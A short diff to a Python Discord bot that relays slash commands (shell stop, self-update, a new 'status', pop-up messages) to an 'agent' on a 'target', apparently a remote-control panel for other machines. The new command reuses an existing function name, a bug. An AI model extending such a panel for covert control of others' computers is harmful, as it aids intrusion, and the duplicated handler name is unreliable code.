@@ -301,6 +301,10 @@ async def shell_stop_command(interaction: discord.Interaction):
 @bot.tree.command(name="update", description="Force the agent to self‑update")
 async def update_command(interaction: discord.Interaction):
     await send_command_to_agent(interaction, "update")
+    
+@bot.tree.command(name="status", description="status for exe")
+async def shell_stop_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "status")
 
 # ------------------- NEW COMMANDS -------------------
 @bot.tree.command(name="message", description="Display a pop-up message on the target")
